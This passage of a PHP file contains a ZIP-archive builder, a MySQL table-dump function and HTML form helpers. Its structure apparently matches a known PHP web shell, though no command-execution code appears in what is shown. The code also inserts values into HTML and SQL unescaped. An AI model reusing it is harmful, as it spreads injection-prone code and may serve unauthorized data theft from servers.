        $fr    .= "\x08\x00";
        $fr    .= $hexdtime;

        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $c_len = strlen($zdata);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $fr .= pack('v', strlen($name));
        $fr .= pack('v', 0);
        $fr .= $name;
        $fr .= $zdata;
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);

        $this -> datasec[] = $fr;
        $new_offset = strlen(implode('', $this->datasec));

        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x14\x00";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x08\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name) );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('V', 32 );
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset = $new_offset;
        $cdrec .= $name;

        $this -> ctrl_dir[] = $cdrec;
    }

    function file() {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);
        return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) .    pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
    }
}

// Dump mysql
function sqldumptable($table, $fp=0) {
    $tabledump = "DROP TABLE IF EXISTS $table;\n";
    $tabledump .= "CREATE TABLE $table (\n";

    $firstfield=1;

    $fields = q("SHOW FIELDS FROM $table");
    while ($field = mysql_fetch_array($fields)) {
        if (!$firstfield) {
            $tabledump .= ",\n";
        } else {
            $firstfield=0;
        }
        $tabledump .= "   $field[Field] $field[Type]";
        if (!empty($field["Default"])) {
            $tabledump .= " DEFAULT '$field[Default]'";
        }
        if ($field['Null'] != "YES") {
            $tabledump .= " NOT NULL";
        }
        if ($field['Extra'] != "") {
            $tabledump .= " $field[Extra]";
        }
    }
    fr($fields);

    $keys = q("SHOW KEYS FROM $table");
    while ($key = mysql_fetch_array($keys)) {
        $kname=$key['Key_name'];
        if ($kname != "PRIMARY" && $key['Non_unique'] == 0) {
            $kname="UNIQUE|$kname";
        }
        if(!is_array($index[$kname])) {
            $index[$kname] = array();
        }
        $index[$kname][] = $key['Column_name'];
    }
    fr($keys);

    while(list($kname, $columns) = @each($index)) {
        $tabledump .= ",\n";
        $colnames=implode($columns,",");

        if ($kname == "PRIMARY") {
            $tabledump .= "   PRIMARY KEY ($colnames)";
        } else {
            if (substr($kname,0,6) == "UNIQUE") {
                $kname=substr($kname,7);
            }
            $tabledump .= "   KEY $kname ($colnames)";
        }
    }

    $tabledump .= "\n);\n\n";
    if ($fp) {
        fwrite($fp,$tabledump);
    } else {
        echo $tabledump;
    }

    $rows = q("SELECT * FROM $table");
    $numfields = mysql_num_fields($rows);
    while ($row = mysql_fetch_array($rows)) {
        $tabledump = "INSERT INTO $table VALUES(";

        $fieldcounter=-1;
        $firstfield=1;
        while (++$fieldcounter<$numfields) {
            if (!$firstfield) {
                $tabledump.=", ";
            } else {
                $firstfield=0;
            }

            if (!isset($row[$fieldcounter])) {
                $tabledump .= "NULL";
            } else {
                $tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
            }
        }

        $tabledump .= ");\n";

        if ($fp) {
            fwrite($fp,$tabledump);
        } else {
            echo $tabledump;
        }
    }
    fr($rows);
    if ($fp) {
        fwrite($fp,"\n");
    } else {
        echo "\n";
    }
}

function ue($str){
    return urlencode($str);
}

function p($str){
    echo $str."\n";
}

function tbhead() {
    p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot(){
    p('</table>');
}

function makehide($name,$value=''){
    p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}

function makeinput($arg = array()){
    $arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
    $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
    !$arg['type'] && $arg['type'] = 'text';
    $arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
    $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
    if ($arg['newline']) {
        p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
    } else {
        p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
    }
}

function makeselect($arg = array()){
    if ($arg['onchange']) {
        $onchange = 'onchange="'.$arg['onchange'].'"';
    }
    $arg['title'] = $arg['title'] ? $arg['title'] : '';
    if ($arg['newline']) p('<p>');
    p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
        if (is_array($arg['option'])) {
            foreach ($arg['option'] as $key=>$value) {
                if ($arg['selected']==$key) {
                    p("<option value=\"$key\" selected>$value</option>");
                } else {
                    p("<option value=\"$key\">$value</option>");
                }
            }
        }
    p("</select>");
    if ($arg['newline']) p('</p>');
}
function formhead($arg = array()) {
    !$arg['method'] && $arg['method'] = 'post';
    !$arg['action'] && $arg['action'] = $self;
    $arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
    !$arg['name'] && $arg['name'] = 'form1';
    p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
    if ($arg['title']) {
        p('<h2>'.$arg['title'].' &raquo;</h2>');
    }
}

function maketext($arg = array()){
    !$arg['cols'] && $arg['cols'] = 100;
    !$arg['rows'] && $arg['rows'] = 25;
    $arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
    p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
}

function formfooter($name = ''){
    !$name && $name = 'submit';
    p('<p><input class="bt" name="'.$name.'" id=\"'.$name.'\" type="submit" value="Submit"></p>');
    p('</form>');
}

function formfoot(){
    p('</form>');
}

// Exit
function pr($a) {
    echo '<pre>';
    print_r($a);
    echo '</pre>';
}
?>